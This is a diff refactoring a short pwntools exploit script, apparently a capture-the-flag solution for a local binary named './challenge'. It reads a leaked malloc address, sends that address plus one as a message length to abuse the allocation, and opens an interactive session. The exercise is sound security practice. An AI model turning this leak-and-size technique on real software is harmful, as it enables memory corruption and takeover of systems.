@@ -1,31 +1,34 @@
 from pwn import *
-import time
 
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
-        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
+elf = context.binary = ELF('./challenge', checksec=False)
+libc = elf.libc
 
-gdbscript = '''
-///
-'''.format(**locals())
+gs = '''
+c
+'''
 
-exe = './challenge'
-elf = context.binary = ELF(exe,checksec=True)
-context.log_level = 'debug'
+def start():
+    if args.GDB:
+        return gdb.debug(elf.path, gdbscript=gs)
+    else:
+        return process(elf.path)
 
-io = start()
 
-io.recvuntil(b'Leak: ')
-leak = int(io.recvline(), 16)
+def exploit():
+    io = start()
 
-log.success(f"Leaked malloc address: {hex(leak)}")
+    io.recvuntil(b'Leak: ')
+    leak = int(io.recvline(), 16)
 
-io.sendlineafter(b'Length of your message: ', str(leak + 1))
-io.sendlineafter(b'Enter your message: ', "cool")
+    log.success(f"Leaked malloc address: {hex(leak)}")
 
-io.interactive()
+
+    io.sendlineafter(b'Length of your message: ', str(leak + 1))
+    io.sendlineafter(b'Enter your message: ', "cool")
+
+    io.interactive()
+
+
+if __name__ == "__main__":
+    exploit()
 
